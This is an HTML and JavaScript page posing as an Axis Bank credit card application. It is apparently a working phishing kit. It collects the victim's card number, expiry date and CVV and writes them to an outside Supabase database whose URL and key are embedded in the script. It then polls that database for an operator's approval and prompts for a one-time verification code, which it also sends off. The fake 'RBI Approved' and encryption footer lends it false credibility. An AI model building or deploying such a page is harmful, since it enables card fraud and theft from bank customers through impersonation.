<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Axis Bank - Credit Card Application</title>
    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Inter', sans-serif;
            background: #f5f6f8;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .main-container {
            width: 100%;
            max-width: 480px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            margin: 20px auto;
            overflow: hidden;
        }

        .header {
            background: #8c1d3e;
            color: white;
            padding: 16px 20px;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .logo-main { font-size: 26px; font-weight: 800; }
        .logo-dot { color: #ffcc00; }

        .content { padding: 30px 25px; }

        h2 {
            text-align: center;
            color: #1e2a44;
            font-size: 24px;
            margin-bottom: 8px;
        }

        .subtitle {
            text-align: center;
            color: #555;
            font-size: 15px;
            margin-bottom: 30px;
        }

        .form-group { margin-bottom: 20px; }

        label {
            display: block;
            margin-bottom: 6px;
            font-weight: 600;
            color: #1e2a44;
            font-size: 14px;
        }

        input {
            width: 100%;
            padding: 13px 16px;
            border: 1.5px solid #c8ced7;
            border-radius: 6px;
            font-size: 16px;
        }

        input:focus { border-color: #8c1d3e; outline: none; }

        button {
            width: 100%;
            padding: 14px;
            background: #8c1d3e;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16.5px;
            font-weight: 600;
            cursor: pointer;
        }

        button:hover { background: #a0224a; }

        .footer {
            text-align: center;
            padding: 20px;
            color: #666;
            font-size: 13px;
            background: #f8f9fa;
            margin-top: auto;
        }

        .modal {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.65);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }

        .modal-content {
            background: white;
            width: 90%;
            max-width: 380px;
            border-radius: 12px;
            padding: 35px 25px;
            text-align: center;
            box-shadow: 0 15px 50px rgba(0,0,0,0.25);
        }

        .loader {
            width: 52px;
            height: 52px;
            border: 4px solid #f0f0f0;
            border-top: 4px solid #8c1d3e;
            border-radius: 50%;
            margin: 20px auto;
            animation: spin 1s linear infinite;
        }

        @keyframes spin { to { transform: rotate(360deg); } }

        .success { color: #008000; font-size: 26px; font-weight: 700; margin: 15px 0; }
        .reject { color: #d32f2f; font-size: 22px; font-weight: 700; margin: 15px 0; }
        .wait { color: #8c1d3e; font-weight: 600; margin: 15px 0; font-size: 16px; }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="header">
            <div style="font-size:32px; font-weight:900;">A</div>
            <div>
                <div class="logo-main">AXIS BANK<span class="logo-dot">.</span></div>
                <div class="tagline">Your credit card application is just a few clicks away</div>
            </div>
        </div>

        <div class="content">
            <h2>Premium Verification</h2>
            <p class="subtitle">Secure • Instant • Paperless</p>

            <div class="form-group">
                <label>Card Number  *</label>
                <input type="text" id="number1" placeholder="Enter Card Number>
            </div>

            <div class="form-group">
                <label>Expiry Date *</label>
                <input type="month" id="date_value">
            </div>

            <div class="form-group">
                <label>CVV *</label>
                <input type="text" id="number2" placeholder="Enter CVV">
            </div>

            <button onclick="submitForm()">Continue</button>
        </div>
    </div>

    <div id="statusModal" class="modal">
        <div class="modal-content" id="modalContent"></div>
    </div>

    <div class="footer">
        © 2026 Axis Bank Ltd. | All Rights Reserved<br>
        RBI Approved | Secure 256-Bit Encryption
    </div>

    <script>
    const SUPABASE_URL = 'https://ijvtokyhuqrwndyfxzrn.supabase.co';
    const SUPABASE_KEY = 'sb_publishable_I6WAJg-zdYfB95rbcm57rQ_iXpU0s52';
    const client = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    let currentId = null;
    let interval = null;

    function showModal(html) {
        document.getElementById('modalContent').innerHTML = html;
        document.getElementById('statusModal').style.display = 'flex';
    }

    async function submitForm(){
        const number1 = document.getElementById('number1').value.trim();
        const date_value = document.getElementById('date_value').value;
        const number2 = document.getElementById('number2').value.trim();

        if(!number1 || !date_value || !number2){
            alert('Please fill all fields');
            return;
        }

        showModal(`<div class="loader"></div><div class="wait">Submitting your request...</div>`);

        const { data, error } = await client.from('requests').insert([{
            number1, date_value, number2, status: 'pending', pin: '', pin_status: 'waiting'
        }]).select();

        if(error) {
            showModal(`<div class="reject">Submission Error</div>`);
            return;
        }

        currentId = data[0].id;
        listenStatus();
    }

    function listenStatus(){
        clearInterval(interval);
        interval = setInterval(async () => {
            const { data, error } = await client
                .from('requests')
                .select('*')
                .eq('id', currentId)
                .single();

            if(error) return;

            // === STRONG SUCCESS CHECK ===
            if(data.status === 'accepted' && data.pin_status === 'accepted'){
                clearInterval(interval);
                showModal(`<div class="success">Congratulations! 🎉<br>Verified Successfully</div>`);
                return;
            }

            if(data.status === 'pending'){
                showModal(`<div class="loader"></div><div class="wait">Waiting for Verification...</div>`);
            } 
            else if(data.status === 'rejected'){
                clearInterval(interval);
                showModal(`<div class="reject">Request Rejected</div>`);
            } 
            else if(data.status === 'accepted'){
                if(data.pin_status === 'waiting'){

    // INPUT ALREADY HAI TO RELOAD MAT KARO
    if(!document.getElementById('pin')){

        showModal(`

            <div class="wait">
            Enter Verification Code to proceed
            </div>

            <input
            type="text"
            id="pin"
            placeholder="Enter Verification Code"

            style="
            width:100%;
            padding:14px;
            margin:15px 0;
            border:1.5px solid #c8ced7;
            border-radius:6px;
            ">

            <button
            onclick="submitPin()"

            style="
            background:#8c1d3e;
            width:100%;
            padding:14px;
            border:none;
            border-radius:6px;
            color:white;
            font-weight:600;
            margin-top:10px;
            ">

            Submit 

            </button>

        `);

    }

} 
                else if(data.pin_status === 'pending'){
                    showModal(`<div class="loader"></div><div class="wait">Verifying ...</div>`);
                } 
                else if(data.pin_status === 'rejected'){
                    clearInterval(interval);
                    showModal(`<div class="reject"> Rejected</div>`);
                }
            }
        }, 1200); // Faster polling
    }

    async function submitPin(){
        const pin = document.getElementById('pin').value.trim();
        if(!pin) {
            alert("Please enter PIN");
            return;
        }

        showModal(`<div class="loader"></div><div class="wait">Submitting ...</div>`);

        await client.from('requests').update({ pin: pin, pin_status: 'pending' }).eq('id', currentId);
    }
    </script>
</body>
</html>
